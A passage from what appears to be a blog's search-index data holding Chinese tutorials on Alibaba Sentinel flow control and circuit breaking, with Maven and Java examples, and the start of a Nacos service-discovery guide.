6.2、更多数据源扩展支持Sentinel 默认还支持文件、Nacos、Apollo、Redis 等作为数据源扩展，这里不再累述，具体可以阅读官方文档中的动态规则扩展。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Sentinel 入门教程 - 基础篇",url:"/posts/8facd1ee.html",text:'前言本文针对 Sentinel 1.8.0 及以上版本编写，特别说明除外。由于 1.8.0 版本对熔断降级特性进行了全新的改进升级，建议使用最新版本以更好地利用熔断降级的能力。 流量控制与熔断降级流量控制概述拿旅游景点举个示例，旅游景点通常都会有最大的接待量，不可能无限制的放游客进入，比如故宫每天只卖八万张票，超过八万的游客，无法买票进入，因为如果超过八万人，景点的工作人员可能就忙不过来，过于拥挤的景点也会影响游客的体验和心情，并且还会有安全隐患；只卖 N 张票，这就是一种限流的手段。流量控制在网络传输中是一个常用的概念，它用于调整网络包的发送数据。在网络传输时，任意时间到来的请求往往是随机不可控的，而系统的处理能力是有限的，因此需要根据系统的处理能力对流量进行控制。 熔断降级概述在调用系统的时候，如果调用链路中的某个资源出现了不稳定或者不可用，最终会导致请求发生积压（如下图），而熔断降级就可以解决这个问题。所谓的熔断降级就是当检测到调用链路中某个资源出现不稳定的表现，例如请求响应时间过长或者异常比例升高的时候，则对这个资源的调用进行限制，让请求快速失败，避免影响到其他的资源而导致级联故障（服务雪崩）。 流量控制与熔断降级实现方案Hystrix Hystrix 是由 Netflix 开源的一个针对分布式系统容错处理的开源组件，2011 - 2012 年相继诞生和成熟，在 2018 年 11 月 20 日之后已经停止维护，最后一个正式版本为 1.5.18。Hystrix 单词意为 “豪猪”，浑身有刺保护自己，Hystrix 就是这样一个用来捍卫应用程序健康的利器。进一步说，Hystrix 是一个延迟和容错库，用在隔离远程系统、服务和第三方库，阻止级连故障，在复杂的分布式系统中实现恢复能力，以提高分布式系统的弹性。 Sentinel Sentinel 是阿里巴巴出品的面向分布式服务架构的轻量级流量控制组件，主要以流量为入点，从限流、流量整形、熔断降级、系统负载保护等多个维度来保障微服务的稳定性。 Resilience4j Resilience4j 是一款轻量级，易于使用的容错库，其灵感来自于 Netflix Hystrix，但是专为 Java 8 和函数式编程而设计。轻量级，因为库只使用了 Vavr，它没有任何其他外部依赖下。相比之下，Netflix Hystrix 对 Archaius 具有编译依赖性，Archaius 具有更多的外部库依赖性，例如 Guava 和 Apache Commons Configuration。在 Spring Cloud Greenwich 版中，Spring 官方推荐使用 Resilience4j 替代 Hystrix。 开源实现方案对比附：Sentinel 对比 Hystrix 详解 Sentinel 介绍Sentinel 简介Sentinel 是阿里巴巴出品的面向分布式服务架构的轻量级流量控制组件，主要以流量为入点，从限流、流量整形、熔断降级、系统负载保护等多个维度来保障微服务的稳定性，更多介绍可参考：Sentinel 项目、Sentinel 官方中文文档 Sentinel 历史2012 年，Sentinel 诞生，主要功能为入口流量控制2013 - 2017 年，Sentinel 在阿里巴巴集团内部迅速发展，成为基础技术模块，覆盖了所有的核心场景，Sentinel 也因此积累了大量的流量归整场景以及生产实践2018 年，Sentinel 开源，并持续演进2019 年 Sentinel 朝着多语言扩展的方向不断探索，推出 C++ 原生版本，同时针对 Service Mesh 场景也推出了 Envoy 集群流量控制支持，以解决 Service Mesh 架构下多语言限流的问题2020 年，推出 Sentinel 的 Go 原生版本，继续朝着云原生的方向演进，同时已覆盖微服务、API Gateway 和 Service Mesh 三大板块的核心生态 Sentinel 组成 核心库：主要指 Java 客户端，不依赖任何框架 / 库，能够运行于 Java 7 及以上的版本的运行环境，同时对 Dubbo、Spring Cloud、Spring Cloud Alibaba 等框架也有较好的支持 控制台：控制台主要负责管理推送规则、监控、集群限流分配管理、机器发现等 Sentinel 优势 友好的控制面板，支持实时监控 多种限流。支持 QPS 限流，线程数限流，多种限流策略，如：直接拒绝，冷启动，匀速模式（漏斗） 多种降级模式，支持按平均返回时间降级，按多种异常数降级，按异常比率降级 方便扩展开发，支持 SPI 模式对 chain 进行扩展 支持链路的关联，按链路统计限流，系统保护，热门资源保护等等 Sentinel 特点 丰富的应用场景：Sentinel 承接了阿里巴巴近 10 年的双十一大促流量的核心场景，例如秒杀（即突发流量控制在系统容量可以承受的范围）、消息削峰填谷、集群流量控制、实时熔断下游不可用应用等 广泛的开源生态：Sentinel 提供开箱即用的与其它开源框架 / 库的整合模块，例如与 Spring Cloud、Dubbo、gRPC 的整合，只需要引入相应的依赖并进行简单的配置即可快速地接入 Sentinel 完备的实时监控：Sentinel 同时提供实时的监控功能。开发者可以在控制台中看到接入应用的单台机器秒级数据，甚至 500 台以下规模的集群的汇总运行情况 完善的 SPI 扩展点：Sentinel 提供简单易用、完善的 SPI 扩展接口。可以通过实现扩展接口来快速地定制逻辑，例如定制规则管理、适配动态数据源等 Sentinel 开源生态 AHAS Sentinel 控制台AHAS Sentinel 简介AHAS Sentinel 是 Sentinel 的阿里云上版本（商业版），提供企业级的高可用防护服务，包括： 可靠的实时监控和历史秒级监控数据查询，包含 QPS、RT、load、CPU 使用率等指标，支持按照调用类型分类，支持同比 / 环比展示 热力图概览，可以快速定位不稳定的机器 动态规则管理 / 推送，无需自行配置外部数据源 告警中心（触发流控、CPU 利用率高等事件） 全自动托管、高可用的集群流量控制 针对 Istio/Envoy 集群的 Mesh 高可用防护 Nginx 网关流控 AHAS Sentinel 控制台体验这里只是简单使用 AHAS Sentinel 官方提供的 Demo 包接入到 AHAS Sentinel 控制台，若希望将已有的 Sentinel 项目接入到 AHAS Sentinel 控制台，具体可参考 Sentinel 官方文档。 阿里云开通 AHAS 打开 AHAS 产品主页 在页面右上角单击登录 在页面上输入您的阿里云账号和密码，并单击登录 在产品主页上单击申请免费开通，然后在云产品开通页页面上勾选” 我已阅读并同意《应用高可用服务服务协议》”，并单击立即开通 接入新应用 若应用运行在非阿里云 ECS 环境或本地，需要在左上角选择切换公网环境 获取 Demo 包 点击控制台左侧菜单栏的 应用防护，找到 Tab 页面选择 JAVA 语言 -&gt; 体验 Demo，然后根据页面提示下载 Demo 包 启动 Demo 应用 公网和阿里云经典网络环境下，需要额外指定 License 用于身份校验，VPC 专有网络无需配置 License 12# 启动命令$ java -Dahas.namespace=default -Dproject.name=AppName -Dahas.license=xxxxxxxxxxxxx -jar ahas-sentinel-sdk-demo.jar 等待一会，AHAS Sentinel 控制台就会显示相关监控数据 Sentinel 基础Sentinel 基本概念资源 资源是 Sentinel 的关键概念。它可以是 Java 应用程序中的任何内容，例如，由应用程序自身提供的服务，或由应用程序调用的其它应用提供的服务，甚至可以是一段代码。只要通过 Sentinel API 定义的代码，就是资源，能够被 Sentinel 保护起来。大部分情况下，可以使用方法签名，URL，甚至服务名称作为资源名来标示资源。 规则 围绕资源的实时状态设定的规则，可以包括流量控制规则、熔断降级规则以及系统保护规则。所有规则可以动态实时调整。 Sentinel 设计理念流量控制设计理念Sentinel 流量控制有以下几个角度: 运行指标，例如 QPS、线程池、系统负载等 控制的效果，例如直接限流、冷启动、排队等 资源的调用关系，例如资源的调用链路，资源和资源之间的关系 熔断降级设计理念Sentinel 和 Hystrix 的原则是一致的，即当检测到调用链路中某个资源出现不稳定的表现，例如请求响应时间过长或异常比例升高的时候，则对这个资源的调用进行限制，让请求快速失败，避免影响到其它的资源而导致级联故障。但在限制的手段上，Sentinel 和 Hystrix 采取了完全不一样的方法。Hystrix 通过线程池隔离的方式，来对依赖（在 Sentinel 的概念中对应资源）进行了隔离。这样做的好处是资源和资源之间做到了最彻底的隔离。缺点是除了增加了线程切换的成本（过多的线程池导致线程数目过多），还需要预先给各个资源做线程池大小的分配，并且对于一些使用了 ThreadLocal 的场景来说会有问题（如 Spring 的事务）。Sentinel 对这个问题采取了以下两种手段来解决： 通过并发线程数进行限制 和资源池隔离的方法不同，Sentinel 通过限制资源并发线程的数量，来减少不稳定资源对其它资源的影响。这样不但没有线程切换的损耗，也不需要您预先分配线程池的大小。当某个资源出现不稳定的情况下，例如响应时间变长，对资源的直接影响就是会造成线程数的逐步堆积。当线程数在特定资源上堆积到一定的数量之后，对该资源的新请求就会被拒绝，堆积的线程完成任务后才开始继续接收请求。 针对慢调用和异常对资源进行降级 除了对并发线程数进行控制以外，Sentinel 还可以根据响应时间和异常等不稳定因素来快速对不稳定的调用进行熔断。当依赖的资源出现响应时间过长后，所有对该资源的访问都会被直接拒绝，直到过了指定的时间窗口之后才重新渐进式地恢复。 系统自适应保护理念Sentinel 同时提供系统维度的自适应保护能力。防止雪崩，是系统防护中重要的一环。当系统负载较高的时候，如果还持续让请求进入，可能会导致系统崩溃，无法响应。在集群环境下，网络负载均衡会把本应这台机器承载的流量转发到其它的机器上去。如果这个时候其它的机器也处在一个边缘状态的时候，这个增加的流量就会导致这台机器也崩溃，最后导致整个集群不可用。针对这个情况，Sentinel 提供了对应的保护机制，让系统的入口流量和系统的负载达到一个平衡，保证系统在能力范围之内处理最多的请求。 Sentinel 流量控制入门案例版本说明本案例使用的 Spring Boot 版本为 2.1.4.RELEASE，Sentinel 版本为 1.8.0，点击下载完整的案例代码。 本地 Sentinel 控制台搭建Sentinel 提供了一个轻量级的开源控制台，它提供机器发现以及健康状况管理、实时监控（单机和集群），规则管理和推送功能 下载 Sentinel 控制台Sentinel 控制台下载有两种方式，一种是直接下载编译好的 Release 版本程序包，另一种是下载 Sentinel 控制台的工程源码，在本地打包后启动，这里采用第一种方式 12# 下载命令$ wget https://github.com/alibaba/Sentinel/releases/download/v1.8.0/sentinel-dashboard-1.8.0.jar 启动 Sentinel 控制台启动 Sentinel 控制台需要依赖 JDK 版本为 1.8 及以上版本，使用以下命令启动控制台： 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 浏览器访问 http://127.0.0.1:9000，默认登录的用户名和密码为：sentinel/sentinel Sentinel 控制台启动参数说明Sentinel 控制台启动时，可配置的 JVM 参数如下： -Dserver.port 指定 Sentinel 控制台监听的端口 -Dproject.name，设置应用在 Sentinel 控制台中显示的名称 -Dcsp.sentinel.dashboard.server 设置应用需要连接到的 Sentinel 控制台的主机地址和端口号 -Dsentinel.dashboard.auth.password=123456 用于指定控制台的登录密码为 123456 -Dsentinel.dashboard.auth.username=sentinel 用于指定控制台的登录用户名为 sentinel -Dserver.servlet.session.timeout=7200 用于指定 Spring Boot 服务端 session 的过期时间，如 7200 表示 7200 秒；60m 表示 60 分钟，默认为 30 分钟 特别注意：Sentinel 控制台启动时，若在 JVM 参数中添加了 -Dproject.name 与 -Dcsp.sentinel.dashboard.server，那么 Sentinel 控制台自身也可以注册到其他 Sentinel 控制台中，Sentinel 控制台甚至可以自己监控自己，启动配置示例如下： 1$ java -Dserver.port=9000 -Dcsp.sentinel.dashboard.server=127.0.0.1:9000 -Dproject.name=sentinel-dashboard -jar sentinel-dashboard-1.8.0.jar 此时浏览器访问 http://127.0.0.1:9000，可以发现控制台会多出一个 sentinel-dashboard 节点： 构建 Sentinel 本地应用引入 Maven 依赖由于需要将应用接入到 Sentinel 控制台，因此引入了 sentinel-transport-simple-http 依赖 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;sentinel.version&gt;1.8.0&lt;/sentinel.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;${sentinel.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-transport-simple-http&lt;/artifactId&gt; &lt;version&gt;${sentinel.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 添加 Java SDK 代码123456789101112131415161718192021222324252627282930313233343536373839404142@RestControllerpublic class HelloController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // 使用流控规则 try (Entry entry = SphU.entry(RESOURCE_NAME)) { // 被保护的资源 return "Hello Sentinel!"; } catch (Exception e) { // 被限流 e.printStackTrace(); return "系统繁忙，请稍后 ..."; } } /** * 当前类的构造函数执行之后执行此方法 */ @PostConstruct public void initFlowRules() { // 创建存放流控规则的集合 List&lt;FlowRule&gt; rules = new ArrayList&lt;&gt;(); // 创建流控规则 FlowRule rule = new FlowRule(); // 定义资源，表示Sentinel会对哪个资源生效 rule.setResource(RESOURCE_NAME); // 定义流控规则的类型 rule.setGrade(RuleConstant.FLOW_GRADE_QPS); // 定义QPS每秒能通过的请求数 rule.setCount(2); // 将流控规则存放在集合中 rules.add(rule); // 加载流控规则 FlowRuleManager.loadRules(rules); }} 1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 将应用连接到 Sentinel 控制台若应用程序需要连接到 Sentinel 控制台， Sentinel 提供如下两种常用的配置方式，具体可参考 Sentinel 官方文档中的启动配置项 JVM -D 参数方式 properties 文件方式（1.7.0 版本开始支持） 这里采用添加 JVM 参数的启动方式，即启动应用时加入以下 JVM 参数： -Dproject.name=sentinel-demo，设置本地应用在 Sentinel 控制台中显示的名称 -Dcsp.sentinel.dashboard.server=127.0.0.1:9000，设置应用需要连接到的 Sentinel 控制台的主机地址和端口号 或者将 JVM 参数添加到 IDEA Configuration 里的 VM options 中： 测试代码 1）启动本地的 Sentinel 控制台，命令如下： 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 2）在 Spring Boot 应用的 JVM 参数中配置 Sentinel 控制台，然后启动应用，若控制台输出以下日志信息，则说明 Sentinel 加载成功 1234INFO: Sentinel log output type is: fileINFO: Sentinel log charset is: utf-8INFO: Sentinel log base directory is: /root/logs/csp/INFO: Sentinel log name use pid is: false 特别注意：当代码里硬编码了流控规则（即使用 Java API 定义和加载流控规则）时，IDE 的控制台才会在应用启动时输出上面 Sentinel 相关的日志信息 3）浏览器访问 http://127.0.0.:9090，查看 Sentinel 控制台的监控信息；这里需要先手动调用一次 http://127.0.0.1:8080/hello 接口，Sentinel 控制台才会显示监控数据 4）浏览器访问 http://127.0.0.1:8080/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 Sentinel 的流控规则生效了 动态配置 Sentinel 的流控规则在上述案例中，将 Sentinel 的流控规则硬编码在 Java 代码里，但在实际的企业项目开发中，这种方式不推荐使用。在日常测试和演示中，一般都会在 Sentinel 控制台里动态配置流控规则，因为这样使用起来比较灵活。首先，将上述案例中添加 Sentinel 流控规则的代码注释掉（示例代码如下），然后在 Spring Boot 应用的 JVM 参数中配置 Sentinel 控制台。重新启动应用后，此时打印的启动日志信息不会再有 Sentinel 相关的内容。特别注意，默认情况下通过 Sentinel 控制台动态添加的规则配置是存放在内存里的，即动态添加的规则配置在 Sentinel 控制台应用重启后会失效。 123456789101112131415161718192021@RestControllerpublic class HelloController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // 使用流控规则 try (Entry entry = SphU.entry(RESOURCE_NAME)) { // 被保护的资源 return "Hello Sentinel!"; } catch (Exception e) { // 被限流 e.printStackTrace(); return "系统繁忙，请稍后 ..."; } }} 浏览器手动调用一次 http://127.0.0.1:8080/hello 接口，然后打开 Sentinel 控制台，动态添加流控规则，表单里的资源名必须与 Java 代码里指定的资源名一致，如下图所示： 浏览器再次访问 http://127.0.0.1:8080/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明动态配置的 Sentinel 流控规则生效了 Sentinel 定义资源的方式资源是 Sentinel 的关键概念，它可以是 Java 应用程序中的任何内容，例如，由应用程序自身提供的服务，或由应用程序调用的其它应用提供的服务，甚至可以是一段代码。使用 Sentinel 来进行资源保护，主要分为两个步骤，包括定义资源和定义规则。先把可能需要保护的资源定义好，之后再配置规则。在编码的时候，只需要考虑这个代码是否需要保护，如果需要保护，就可以将之定义为一个资源。 Sentinel 除了基本的定义资源的方式之外，还有其他定义资源的方式，具体如下： 抛出异常的方式定义资源 返回布尔值方式定义资源 异步调用支持 注解方式定义资源 主流框架的默认适配 版本声明本案例使用的 Spring Boot 版本为 2.1.4.RELEASE，Spring Cloud Alibaba Sentinel 版本为 2.1.3.RELEASE，Sentinel 1.8.0。以下代码，默认都通过 Sentinel 控制台动态配置流控规则来测试，具体不再累述，点击下载完整的案例代码。 添加 Maven 依赖1234567891011121314151617181920212223242526&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 如果不需要使用注解的方式来定义 Sentinel 资源，一般只需要引入以下两个依赖即可，此时启动应用时需要添加 JVM 参数来连接 Sentinel 控制台。否则需要引入 spring-cloud-starter-alibaba-sentinel 依赖，才能让 @SentinelResource 注解生效。 123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;1.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-transport-simple-http&lt;/artifactId&gt; &lt;version&gt;1.8.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 配置 application.yml12345678910server: port: 8080spring: application: name: sentinel-resource-define-demo cloud: sentinel: transport: dashboard: 127.0.0.1:9000 抛出异常的方式定义资源Sentinel 的 SphU 包含了 try-catch 风格的 API。用这种方式，当资源发生了限流之后就会抛出 BlockException 异常。这个时候可以捕获异常，进行限流之后的逻辑处理，而在上述的入门案例中就使用了此种方式进行定义资源，关键代码如下： 123456789101112131415161718192021@RestControllerpublic class TestController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // 使用流控规则 try (Entry entry = SphU.entry(RESOURCE_NAME)) { // 被保护的资源 return "Hello Sentinel!"; } catch (Exception e) { // 被限流 e.printStackTrace(); return "系统繁忙，请稍后 ..."; } }} 返回布尔值方式定义资源Sentinel 的 SphO 提供 if-else 风格的 API，用这种方式，当资源发生了限流之后就会返回 false，这个时候可以根据返回值，进行限流之后的逻辑处理。 123456789101112131415161718192021222324252627@RestControllerpublic class TestBooleanController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Boolean"; @GetMapping("/boolean") public boolean hello() { // 使用流控规则 if (SphO.entry(RESOURCE_NAME)) { // 被保护的资源 try { System.out.println("Hello Sentinel!"); return true; } finally { // 限流的出口 SphO.exit(); } } else { // 被限流 System.out.println("系统繁忙，请稍后 ..."); return false; } }} 特别注意：SphO.entry() 需要与 SphO.exit() 方法成对出现，否则会导致调用链记录异常，抛出 ErrorEntryFreeException 异常。 异步调用方式定义资源Sentinel 支持异步调用链路的统计，在异步调用中，需要通过 SphU.asyncEntry() 方法定义资源，并在需要异步的回调函数中调用 exit() 方法。 1234567891011/** * @EnableAsync 启用Spring的异步调用支持 */@SpringBootApplication@EnableAsyncpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 1234567891011121314151617@Servicepublic class AsyncService { /** * @Async 表示异步调用方法 */ @Async public void hello() { System.out.println("start async method ..."); try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println("end async method ..."); }} 12345678910111213141516171819202122232425262728@RestControllerpublic class TestAsyncController { private static final String RESOURCE_NAME = "Async"; @Autowired private AsyncService asyncService; @GetMapping("/async") public void hello() { AsyncEntry asyncEntry = null; try { // 使用流控规则 asyncEntry = SphU.asyncEntry(RESOURCE_NAME); // 被保护的资源 asyncService.hello(); } catch (BlockException e) { // 被限流 e.printStackTrace(); System.out.println("系统繁忙，请稍后 ..."); } finally { if (asyncEntry != null) { // 限流的出口 asyncEntry.exit(); } } }} 注解方式定义资源 通过 @SentinelResource 注解的 blockHandler 属性制定具体的限流处理方法 实现处理方法，该方法的传参必须与资源点的传参一样，并且最后必须加上 BlockException 异常参数，同时返回类型也必须一样 从 1.4.0 版本开始，使用注解的方式定义资源，默认支持自动统计业务异常，无需再手动调用 Tracer.trace(ex) 来记录业务异常 更多注解属性说明，可以看这里 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class TestAnnotationController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Annotation"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：限流处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/annotation") public String hello() { // 被保护的资源 return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "系统繁忙，请稍候 ..."; }} 下篇 - Sentinel 入门教程（中级篇） Sentinel 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Nacos 入门教程 - 服务发现基础篇",url:"/posts/f9da4c12.html",text:'服务发现介绍微服务架构概述为适应企业的业务发展，提高软件研发的生产力，降低软件研发的成本，软件架构也作了升级和优化，将一个独立的系统拆分成若干小的服务，每个小服务运行在不同的进程中，服务与服务之间采用 RESTful、RPC 等协议传输数据，每个服务所拥有的功能具有独立性强的特点，这样的设计就实现了单个服务的高内聚，服务与服务之间的低耦合效果，这些小服务就是微服务，基于这种方法设计的系统架构即微服务架构。微服务架构的优点如下： 易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少 单个微服务启动较快：单个微服务代码量较少，所以启动会比较快 业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的 局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题 技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈 按需伸缩：可根据需求，实现细粒度的扩展 只有业务逻辑的代码，不会和 HTML、CSS 或者其他前端页面耦合，目前有两种开发模式：前后端分离、全栈开发 什么是服务发现在微服务架构中，整个系统会按职责能力划分为多个服务，通过服务之间协作来实现业务目标。这样在代码中免不了要进行服务间的远程调用，服务的消费方要调用服务的生产方，为了完成一次请求，消费方需要知道服务生产方的网络位置（IP 地址和端口号）。一般情况下，代码可以通过读取配置文件的方式读取服务生产方网络位置，如下图所示： 看上去很完美，但是仔细考虑以下，此方案对于微服务应用而言行不通。首先，微服务可能是部署在云环境的，服务实例的网络位置或许是动态分配的。另外，每一个服务一般会有多个实例来做负载均衡，由于宕机或升级，服务实例网络地址会经常动态改变。再者，每一个服务也可能应对临时访问压力增加新的服务节点，如下图所示： 基于以上的问题，服务之间如何相互发现？服务如何管理？这就是服务发现的问题了。服务发现就是服务消费方通过服务发现中心智能发现服务提供方，从而进行远程调用的过程，如下图所示： 上图中服务实例本身并不记录服务生产方的网络地址，所有服务实例内部都会包含服务发现客户端。 在每个服务启动时会向服务发现中心上报自己的网络位置，这样在服务发现中心内部会形成一个服务注册表，服务注册表是服务发现的核心部分，是包含所有服务实例的网络地址的数据库 服务发现客户端会定期从服务发现中心同步服务注册表，并缓存在客户端 当需要对某服务进行请求时，服务实例通过该注册表，定位目标服务网络地址。若目标服务存在多个网络地址，则使用负载均衡算法从多个服务实例中选择出一个，然后发出请求。 总结： 在微服务环境中，由于服务运行实例的网络地址是不断动态变化的，服务实例数量的动态变化 ，因此无法使用固定的配置文件来记录服务提供方的网络地址，必须使用动态的服务发现机制用于实现微服务间的相互感知。各服务实例会上报自己的网络地址，这样服务中心就形成了一个完整的服务注册表，各服务实例会通过服务发现中心来获取访问目标服务的网络地址，从而实现服务发现的机制。 服务发现协作流程 服务发现产品对比 Nacos 作为服务发现中心，具备更多的功能支持项，且从长远来看 Nacos 在以后的版本会支持 Spring Cloud + Kubernetes 的组合，填补两者者的鸿沟，在两套体系下可以采用同一套服务发现和配置管理的解决方案，这将大大的简化使用和维护的成本。另外，Nacos 计划实现 Service Mesh，也是未来微服务发展的趋势，更多关于 Nacos 的介绍可以看这里。 Nacos 服务发现管理服务发现数据模型Nacos 在经过阿里内部多年生产经验后提炼出的数据模型，是一种服务 - 集群 - 实例的三层模型，这样基本可以满足服务在所有场景下的数据存储和管理。 命名空间（Namespace） 用于进行租户粒度的配置隔离，命名空间不仅适用于 Nacos 的配置管理，同样适用于服务发现。Namespace 的常用场景之一是不同环境的配置的区分隔离，例如开发测试环境和生产环境的资源（如配置、服务）隔离等。 服务 提供给客户端的软件功能，通过预定义接口进行网络访问。 服务名 服务提供方的标识，通过该标识可以唯一确定其指代的服务。 实例 提供一个或多个服务的具有可访问网络地址（IP:Port）的进程，启动一个服务，就产生了一个服务实例。 元信息 Nacos 数据（如配置和服务）描述信息，如服务版本、权重、容灾策略、负载均衡策略、鉴权配置、各种自定义标签 (label），从作用范围来看，分为服务级别的元信息、集群的元信息及实例的元信息 集群 服务实例的集合，服务实例组成一个默认集群，集群可以被进一步按需求划分，划分的单位可以是虚拟集群，相同集群下的实例才能相互感知。 服务发现配置示例应用通过 Namespace、Cluster、Service 的配置，描述了该服务向哪个环境（如开发环境）的哪个集群注册实例 123456789spring: application: name: transaction‐service cloud: nacos: discovery: server‐addr: 127.0.0.1:8848 namespace: a1f8e863‐3117‐48c4‐9dd3‐e9ddc2af90a8 cluster-name: DEFAULT 集群作为实例的隔离，相同集群的实例才能相互感知 namespace、cluster-name 若不填写都将采用默认值，namespace 的默认是 public 命名空间，cluster-name 的默认值为 DEFAULT 集群 服务发现管理功能服务管理 开发者或者运维人员往往需要在服务注册后，通过友好的界面来查看服务的注册情况，包括当前系统注册的所有服务和每个服务的详情。并在有权限控制的情况下，进行服务的一些配置的编辑操作。Nacos 在目前最新版本开放的控制台的服务发现部分，主要就是提供用户一个基本的运维页面，能够查看、编辑当前注册的服务，这些功能集中在 Nacos 控制台的服务管理一级菜单内。 服务列表管理 服务列表帮助用户以统一的视图管理其所有的微服务以及服务健康状态。整体界面布局是左上角有服务的搜索框和搜索按钮，页面中央是服务列表的展示。服务列表主要展示服务名、集群数目、实例数目、健康实例数目和详情按钮五个栏目。 服务流量权重支持及流量保护 Nacos 为用户提供了流量权重控制的能力，同时开放了服务流量的阈值保护，以帮助用户更好的保护服务服务提供者集群不被意外打垮。如下图所示，可以点击实例的 编辑 按钮，修改实例的权重。如果想增加实例的流量，可以将权重调大；如果不想实例接收流量，则可以将权重设为 0。 服务元数据管理 Nacos 提供多个维度的服务元数据的暴露，帮助用户存储自定义的信息。这些信息都是以 K-V 